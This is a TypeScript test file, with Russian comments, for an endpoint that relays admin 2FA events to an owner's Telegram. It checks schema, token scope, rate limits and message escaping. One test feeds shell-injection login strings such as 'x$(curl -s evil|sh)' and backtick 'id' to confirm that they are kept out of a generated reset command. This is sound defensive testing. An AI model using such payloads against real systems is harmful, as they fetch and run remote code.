/**
 * POST /api/oq/v1/notify — события 2FA от backend продукта (#351 PR-2, план platform-admin-mfa.md, п. 7):
 * схема, область notify (и что такой токен больше ничего не открывает), 30 в час на токен, повтор
 * login + event + минута (+ remaining), 202 и доставка после ответа — только в личную подписку владельца.
 * Telegram API перехвачен на уровне httpRequest.
 */
import { afterAll, beforeAll, describe, expect, it, vi, type MockInstance } from 'vitest'
import { desc, eq } from 'drizzle-orm'
import { freshApp, OWNER } from './helpers'
import { getDb } from '../server/db/client'
import { activity, tgBot, tgSubscriptions, users } from '../server/db/schema'
import { encryptSecret, hashPassword } from '../server/lib/crypto'
import * as http from '../server/lib/http'
import { createToken } from '../server/queue/auth'
import { ownerMessage, settleNotifyForTests, shortUa } from '../server/queue/notify'

const BOT_ID = '123456789'
const TOKEN = `${BOT_ID}:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
const OWNER_CHAT = '7001'
const OPERATOR_CHAT = '7002'
const CHROME_MAC =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

let app: Awaited<ReturnType<typeof freshApp>>
let spy: MockInstance<typeof http.httpRequest>
let sent: Array<{ chatId: string; text: string }>
let n = 0

/** Свой токен на каждый сценарий: предел 30 в час считается по токену. */
async function notifyToken(scopes: Array<'notify' | 'read' | 'agent' | 'owner'> = ['notify']) {
  return (await createToken(`notify-${++n}`, scopes)).token
}

async function call(token: string, method: string, path: string, body?: unknown) {
  const res = await app.request(`/api/oq/v1${path}`, {
    method,
    headers: { Authorization: `Bearer ${token}`, ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}) },
    body: body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body),
  })
  const text = await res.text()
  return { status: res.status, json: (text.startsWith('{') ? JSON.parse(text) : null) as Record<string, any> | null }
}

const post = (token: string, body: unknown) => call(token, 'POST', '/notify', body)

let minute = Date.parse('2026-11-08T02:00:00Z')
/** Каждое событие — в свою минуту, чтобы сценарии не гасили друг друга как повторы. */
const nextAt = () => new Date((minute += 60_000)).toISOString()
const event = (over: Record<string, unknown> = {}) => ({ event: 'enabled', login: 'admin@hrhelper.space', at: nextAt(), ua: CHROME_MAC, ip: '203.0.113.7', ...over })

async function lastActivity() {
  return (await getDb().select().from(activity).where(eq(activity.kind, 'auth')).orderBy(desc(activity.id)).limit(1))[0]
}

beforeAll(async () => {
  app = await freshApp()
  sent = []
  spy = vi.spyOn(http, 'httpRequest').mockImplementation(async (url, opts) => {
    const body = JSON.parse(String(opts?.body ?? '{}')) as Record<string, any>
    if (url.endsWith('/sendMessage')) sent.push({ chatId: String(body.chat_id), text: String(body.text) })
    return { status: 200, ok: true, text: JSON.stringify({ ok: true, result: { message_id: 900 + sent.length } }), latencyMs: 1 }
  })
  const db = getDb()
  await db.insert(tgBot).values({ id: 1, botTokenEnc: encryptSecret(TOKEN), botId: BOT_ID, passwordVersion: 1 })
  const owner = (await db.select().from(users).where(eq(users.email, OWNER.email)))[0]!
  const [operator] = await db
    .insert(users)
    .values({ email: 'op@ops.test', name: 'Op', role: 'operator', passwordHash: await hashPassword('operator-password-1'), createdAt: new Date() })
    .returning()
  const sub = (userId: number, chatId: string) => ({ userId, botId: BOT_ID, tgUserId: chatId, chatId, state: 'active' as const, confirmedVersion: 1 })
  await db.insert(tgSubscriptions).values([sub(owner.id, OWNER_CHAT), sub(operator!.id, OPERATOR_CHAT)])
})

afterAll(() => spy.mockRestore())

describe('202 и доставка', () => {
  it('событие — 202 сразу, сообщение только в личную подписку владельца, строка ленты без IP', async () => {
    const t = await notifyToken()
    const res = await post(t, event({ event: 'recovery_login', remaining: 7 }))
    expect(res.status).toBe(202)
    expect(res.json).toEqual({ accepted: true, duplicate: false })
    await settleNotifyForTests()
    expect(sent.map((s) => s.chatId)).toEqual([OWNER_CHAT])
    expect(sent[0]!.text).toContain('2FA: admin@hrhelper.space — выполнен вход резервным кодом (осталось 7 из 10)')
    expect(sent[0]!.text).toContain('Chrome 131, macOS, IP 203.0.113.7')
    // Строка runbook docs/ops/deploy-contabo.md (#554) — как есть, с полным путём contabo-compose.sh.
    expect(sent[0]!.text).toContain(
      "Если не ожидали — сброс на сервере: <code>/opt/hr-helper/infra/scripts/prod/contabo-compose.sh exec -T -w /app/apps/backend backend node dist/scripts/platform-admin-mfa.js --reset 'admin@hrhelper.space'</code>",
    )
    const row = await lastActivity()
    expect(row?.message).toBe('2FA-событие «recovery_login» для admin@hrhelper.space: доставлено владельцу в Telegram')
    expect(row?.actor).toMatch(/^token:notify-/)
    expect(row?.message).not.toContain('203.0.113.7')
  })

  it('отказ Telegram — всё равно 202, причина видна в ленте консоли', async () => {
    sent = []
    // 500, а не «бот заблокирован»: та ошибка остановила бы подписку владельца (noteDeliveryFailure).
    spy.mockImplementationOnce(async () => ({ status: 500, ok: false, text: JSON.stringify({ ok: false, error_code: 500, description: 'Internal Server Error' }), latencyMs: 1 }))
    const res = await post(await notifyToken(), event({ event: 'changed' }))
    expect(res.status).toBe(202)
    await settleNotifyForTests()
    expect((await lastActivity())?.message).toMatch(/^2FA-событие «changed» для admin@hrhelper\.space: доставлено 0 из 1: /)
  })

  it('выключатель off/on — без логина, с временем до', async () => {
    sent = []
    const t = await notifyToken()
    expect((await post(t, { event: 'off', at: nextAt(), until: '2026-11-08T06:30:00Z' })).status).toBe(202)
    expect((await post(t, { event: 'on', at: nextAt() })).status).toBe(202)
    await settleNotifyForTests()
    expect(sent.map((s) => s.text)).toEqual([
      expect.stringMatching(/^2FA: требование для администраторов снято до (08\.11 )?09:30 командой на сервере$/),
      expect.stringMatching(/^2FA: требование для администраторов вернулось в (08\.11 )?05:\d\d$/),
    ])
  })

  it('владелец без подписки — 202, «не доставлено» в ленте', async () => {
    await getDb().update(tgSubscriptions).set({ state: 'suspended' }).where(eq(tgSubscriptions.chatId, OWNER_CHAT))
    try {
      expect((await post(await notifyToken(), event({ event: 'reset' }))).status).toBe(202)
      await settleNotifyForTests()
      expect((await lastActivity())?.message).toBe('2FA-событие «reset» для admin@hrhelper.space: не доставлено: у владельца нет действующей Telegram-подписки в боте консоли')
    } finally {
      await getDb().update(tgSubscriptions).set({ state: 'active' }).where(eq(tgSubscriptions.chatId, OWNER_CHAT))
    }
  })

  // Логин — PlatformAdmin.username без ограничения набора символов в backend: 400 потерял бы сигнал. Команду владелец
  // копирует в shell (ревью «Контроля», CHANGES-1) — для такого логина её нет.
  it.each(['x$(curl -s evil|sh)', 'a;b', 'a`id`', "a'b", 'a"b', 'a b', 'a(b)', '-rf', 'Админ'])(
    'логин %s — 202, сигнал владельцу без готовой команды сброса',
    async (login) => {
      sent = []
      expect((await post(await notifyToken(), event({ login }))).status).toBe(202)
      await settleNotifyForTests()
      expect(sent).toHaveLength(1)
      expect(sent[0]!.text).toContain('логин в команду не подставлен: в нём особые символы')
      expect(sent[0]!.text).not.toContain('--reset')
    },
  )
})

describe('повтор login + event + минута', () => {
  it('тот же логин, событие и минута — 202 duplicate без второго сообщения; другая минута или событие — новое', async () => {
    sent = []
    const t = await notifyToken()
    const at = nextAt()
    const first = await post(t, event({ at }))
    const again = await post(t, event({ at: new Date(Date.parse(at) + 30_000).toISOString(), ip: '198.51.100.1' }))
    expect(first.json).toEqual({ accepted: true, duplicate: false })
    expect(again.status).toBe(202)
    expect(again.json).toEqual({ accepted: true, duplicate: true })
    expect((await post(t, event({ at, event: 'changed' }))).json?.duplicate).toBe(false)
    expect((await post(t, event({ at: new Date(Date.parse(at) + 60_000).toISOString() }))).json?.duplicate).toBe(false)
    await settleNotifyForTests()
    expect(sent).toHaveLength(3)
  })

  it('два входа резервными кодами за одну минуту (7, потом 6 из 10) — два сообщения; тот же remaining — повтор', async () => {
    sent = []
    const t = await notifyToken()
    const at = nextAt()
    const login = (remaining: number) => post(t, event({ event: 'recovery_login', remaining, at }))
    expect((await login(7)).json?.duplicate).toBe(false)
    expect((await login(6)).json?.duplicate).toBe(false)
    expect((await login(6)).json?.duplicate).toBe(true)
    await settleNotifyForTests()
    expect(sent.map((s) => s.text.match(/осталось \d+ из 10/)?.[0])).toEqual(['осталось 7 из 10', 'осталось 6 из 10'])
  })
})

describe('схема', () => {
  const bad: Array<[string, unknown]> = [
    ['неизвестное событие', event({ event: 'deleted' })],
    ['лишнее поле', event({ code: '123456' })],
    ['логин длиннее 254', event({ login: `${'a'.repeat(250)}@x.io` })],
    ['перевод строки в логине', event({ login: 'a@x.io\n2FA: всё хорошо' })],
    ['нет логина у события учётной записи', event({ login: undefined })],
    ['логин у off/on', { event: 'on', login: 'a@x.io', at: nextAt() }],
    ['off без until', { event: 'off', at: nextAt() }],
    ['until не у off', event({ until: nextAt() })],
    ['remaining не у recovery_login', event({ remaining: 3 })],
    ['remaining больше 10', event({ event: 'recovery_login', remaining: 11 })],
    ['at не ISO', event({ at: '08.11.2026 05:00' })],
    ['ip не адрес', event({ ip: '203.0.113.7<script>' })],
    ['ua длиннее 512', event({ ua: 'x'.repeat(513) })],
  ]
  it.each(bad)('%s — 400', async (_name, body) => {
    expect((await post(await notifyToken(), body)).status).toBe(400)
  })

  it('не JSON — 400; тело больше 4 КБ — 413; IPv6 и «at» со смещением — 202', async () => {
    const t = await notifyToken()
    expect((await post(t, '{not json')).status).toBe(400)
    expect((await post(t, event({ ua: 'x'.repeat(5000) }))).status).toBe(413)
    expect((await post(t, event({ ip: '2001:db8::1', at: '2026-11-08T05:59:00+03:00', ua: undefined }))).status).toBe(202)
  })
})

describe('область notify', () => {
  it('без токена — 401; токены agent и read — 403; owner — 202', async () => {
    const anon = await app.request('/api/oq/v1/notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(event()) })
    expect(anon.status).toBe(401)
    expect((await post(await notifyToken(['read', 'agent']), event())).status).toBe(403)
    expect((await post(await notifyToken(['read']), event())).status).toBe(403)
    expect((await post(await notifyToken(['owner']), event())).status).toBe(202)
  })

  it('токен notify не читает и не пишет очередь и не открывает страницу /queue', async () => {
    const t = await notifyToken()
    expect((await call(t, 'GET', '/db/items')).status).toBe(403)
    expect((await call(t, 'PUT', '/db/items/d-x', { data: { kind: 'decision', title: 'x' } })).status).toBe(403)
    expect((await call(t, 'GET', '/relay')).status).toBe(403)
    expect((await call(t, 'GET', '/files')).status).toBe(403)
    const page = await app.request('/queue', { headers: { Authorization: `Bearer ${t}` } })
    expect(page.status).toBe(302)
  })

  it('notify не смешивается с другими областями при выпуске', async () => {
    await expect(createToken('mixed', ['notify', 'agent'])).rejects.toThrow(/отдельным токеном/)
  })
})

describe('предел 30 в час на токен', () => {
  it('31-й запрос — 429, считаются и отказы схемы; у другого токена свой счёт', async () => {
    const t = await notifyToken()
    for (let i = 0; i < 29; i++) expect((await post(t, event())).status).toBe(202)
    expect((await post(t, { event: 'nope' })).status).toBe(400)
    expect((await post(t, event())).status).toBe(429)
    expect((await post(await notifyToken(), event())).status).toBe(202)
    await settleNotifyForTests()
  })
})

describe('текст владельцу', () => {
  it('браузер и ОС из User-Agent; HTML экранирован', () => {
    expect(shortUa(CHROME_MAC)).toBe('Chrome 131, macOS')
    expect(shortUa('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0')).toBe('Edge 131, Windows')
    expect(shortUa('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1')).toBe('Safari 18, iOS')
    expect(shortUa('curl/8.7.1')).toBe('curl/8.7.1')
    const m = ownerMessage({ event: 'enabled', login: '<b>x</b>@a.io', at: '2026-11-08T02:00:00Z' }, 'Europe/Minsk', Date.parse('2026-11-08T03:00:00Z'))
    expect(m.html).toBe('2FA: &lt;b&gt;x&lt;/b&gt;@a.io — настроена двухфакторная защита (2FA), 05:00. Если не ожидали — сброс на сервере по строке runbook «2FA администратора платформы: сброс» (docs/ops/deploy-contabo.md); логин в команду не подставлен: в нём особые символы.')
  })
})
